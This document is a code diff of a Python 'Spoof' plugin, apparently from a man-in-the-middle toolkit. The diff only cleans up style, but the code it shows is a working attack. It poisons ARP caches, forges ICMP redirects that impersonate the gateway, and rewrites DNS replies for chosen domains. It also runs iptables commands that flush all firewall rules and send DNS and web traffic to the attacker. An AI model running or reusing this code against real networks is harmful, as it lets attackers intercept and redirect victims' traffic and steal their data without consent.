@@ -8,7 +8,7 @@ from plugins.plugin import Plugin
 from time import sleep
 import nfqueue
 import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Gets rid of IPV6 Error when importing scapy
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  #Gets rid of IPV6 Error when importing scapy
 from scapy.all import *
 import os
 import sys
@@ -19,13 +19,14 @@ try:
 except:
     sys.exit('[-] configobj library not installed!')
 
+
 class Spoof(Plugin):
     name = "Spoof"
     optname = "spoof"
     desc = 'Redirect traffic using ICMP, ARP or DNS'
     has_opts = True
 
-    def initialize(self,options):
+    def initialize(self, options):
         '''Called if plugin is enabled, passed the options namespace'''
         self.options = options
         self.interface = options.interface
@@ -55,8 +56,8 @@ class Spoof(Plugin):
         if not self.manualiptables:
             os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
 
-        if self.arp == True:
-            if self.icmp == True:
+        if self.arp:
+            if self.icmp:
                 sys.exit("[-] --arp and --icmp are mutually exclusive")
 
             if (not self.interface or not self.gateway):
@@ -70,19 +71,19 @@ class Spoof(Plugin):
             elif self.arpmode == 'rep':
                 pkt = self.build_arp_rep()
 
-        elif self.icmp == True:
-            if self.arp == True:
+        elif self.icmp:
+            if self.arp:
                 sys.exit("[-] --icmp and --arp are mutually exclusive")
 
             if (not self.interface or not self.gateway or not self.target):
                 sys.exit("[-] ICMP Redirection requires --gateway, --iface and --target")
-            
+
             self.mac = get_if_hwaddr(self.interface)
             self.routermac = getmacbyip(self.gateway)
             print "[*] ICMP Redirection enabled"
             pkt = self.build_icmp()
 
-        if self.summary == True:
+        if self.summary:
             pkt.show()
             ans = raw_input('\n[*] Continue? [Y|n]: ').lower()
             if ans == 'y' or len(ans) == 0:
@@ -90,13 +91,13 @@ class Spoof(Plugin):
             else:
                 sys.exit(0)
 
-        if self.dns == True:
+        if self.dns:
             if not self.dnscfg:
                 if (not self.dnsip or not self.domain):
                     sys.exit("[-] DNS Spoofing requires --domain, --dnsip")
             elif self.dnscfg:
                 self.dnscfg = ConfigObj(self.dnscfg)
-            
+
             if not self.manualiptables:
                 os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
             print "[*] DNS Spoofing enabled"
@@ -109,40 +110,40 @@ class Spoof(Plugin):
             print '[*] Setting up iptables rules'
             os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port %s' % self.port)
 
-        t = threading.Thread(name='send_packets', target=self.send_packets, args=(pkt,self.interface,self.debug,))
+        t = threading.Thread(name='send_packets', target=self.send_packets, args=(pkt, self.interface, self.debug,))
         t.setDaemon(True)
         t.start()
-  
-    def send_packets(self,pkt,interface, debug):
-        while self.send == True:
+
+    def send_packets(self, pkt, interface, debug):
+        while self.send:
             sendp(pkt, inter=2, iface=interface, verbose=debug)
-    
+
     def build_icmp(self):
-        pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=get_if_addr(self.interface))/\
+        pkt = IP(src=self.gateway, dst=self.target)/ICMP(type=5, code=1, gw=get_if_addr(self.interface)) /\
               IP(src=self.target, dst=self.gateway)/UDP()
 
         return pkt
 
     def build_arp_req(self):
-        if self.target == None:
+        if self.target is None:
             pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, pdst=self.gateway)
         elif self.target:
             target_mac = getmacbyip(self.target)
-            if target_mac == None:
+            if target_mac is None:
                 sys.exit("[-] Error: Could not resolve targets MAC address")
-                
+
             pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=target_mac, pdst=self.target)
-        
+
         return pkt
 
     def build_arp_rep(self):
-        if self.target == None:
+        if self.target is None:
             pkt = Ether(src=self.mac, dst='ff:ff:ff:ff:ff:ff')/ARP(hwsrc=self.mac, psrc=self.gateway, op=2)
         elif self.target:
             target_mac = getmacbyip(self.target)
-            if target_mac == None:
+            if target_mac is None:
                 sys.exit("[-] Error: Could not resolve targets MAC address")
-                
+
             pkt = Ether(src=self.mac, dst=target_mac)/ARP(hwsrc=self.mac, psrc=self.gateway, hwdst=target_mac, pdst=self.target, op=2)
 
         return pkt
@@ -154,16 +155,16 @@ class Spoof(Plugin):
             payload.set_verdict(nfqueue.NF_ACCEPT)
         else:
             if self.dnscfg:
-                for k,v in self.dnscfg.items():
+                for k, v in self.dnscfg.items():
                     if k in pkt[DNS].qd.qname:
                         self.modify_dns(payload, pkt, v)
-            
+
             elif self.domain in pkt[DNS].qd.qname:
                 self.modify_dns(payload, pkt, self.dnsip)
 
     def modify_dns(self, payload, pkt, ip):
-        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
+                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
                       DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ip))
 
         payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
@@ -176,16 +177,16 @@ class Spoof(Plugin):
         self.q.set_queue_maxlen(5000)
         reactor.addReader(self)
         self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
-    
+
     def fileno(self):
         return self.q.get_fd()
-    
+
     def doRead(self):
         self.q.process_pending(100)
-    
+
     def connectionLost(self, reason):
         reactor.removeReader(self)
-    
+
     def logPrefix(self):
         return 'queue'
 
@@ -214,11 +215,11 @@ class Spoof(Plugin):
             print '\n[*] Flushing iptables rules'
             os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
 
-        if self.dns == True:
+        if self.dns:
             self.q.unbind(socket.AF_INET)
             self.q.close()
-        
-        if self.arp == True:
+
+        if self.arp:
             print '[*] Re-arping network'
             pkt = Ether(src=self.routermac, dst='ff:ff:ff:ff:ff:ff')/ARP(psrc=self.gateway, hwsrc=self.routermac, op=2)
             sendp(pkt, inter=1, count=5, iface=self.interface)
